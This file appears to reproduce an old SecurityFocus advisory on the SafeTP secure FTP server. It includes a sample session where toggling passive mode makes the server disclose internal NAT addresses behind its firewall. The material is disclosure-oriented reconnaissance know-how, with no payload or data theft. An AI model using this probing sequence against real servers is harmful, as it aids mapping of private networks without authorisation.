@@ -1,0 +1,40 @@
+source: http://www.securityfocus.com/bid/5822/info
+
+SafeTP is a freely available, open source secure ftp client-server software package. It is available for Unix, Linux, and Microsoft Operating Systems.
+
+It has been reported that under some circumstances, the SafeTP server may reveal sensitive network information. When a passive session is initiated in a specific manner, SafeTP may return the address of a system serving files that is behind at NAT firewall.
+
+220-SafeTP: Negotiating FTP connection...
+220-safetp.nowhere.com X2 WS_FTP Server 3.1.0 (1506847632)
+220-Changed to Protect the Innocent
+220-safetp.nowhere.com X2 WS_FTP Server 3.1.0 (1506847632)
+220-*** This server can accept secure (encrypted) connections. ***
+220-*** See http://safetp.cs.berkeley.edu for info. ***
+220 SafeTP: Control channel secure: X-SafeTP1. Data channel secure. PBSZ=32801b
+Connected to safetp.nowhere.com.
+User: SomeUser
+331 Password required
+Password: *********
+230-user logged in
+230-Hello Some User. Welcome to the SafeTP File Transfer System!
+230 user logged in
+ftp> ls
+200 PORT command ok.
+Timed out waiting for connection from server.
+ftp> passive
+Passive mode On .
+ftp> ls
+425 Failed to connect to 192.168.3.162, port 3303: connect: Connection timed out (code 10060)
+ftp> passive
+Draining: 510 Assertion failed: ftpd reply: 150 Opening ASCII data connection for directory listing
+Draining: 227 Entering Passive Mode (10,7,34,85,5,133).
+Passive mode Off .
+ftp> put tendot.txt
+227 Entering passive mode (169,229,60,94,156,186).
+150 Opening ASCII data connection for tendot.txt
+226 transfer complete
+ftp: 1094 bytes sent in 0.98Seconds 1.09Kbytes/sec.
+ftp> quit
+221-Good-Bye
+221-Goodbye Some User. Thank you for visiting the SafeTP File Transfer System!
+221 Good-Bye
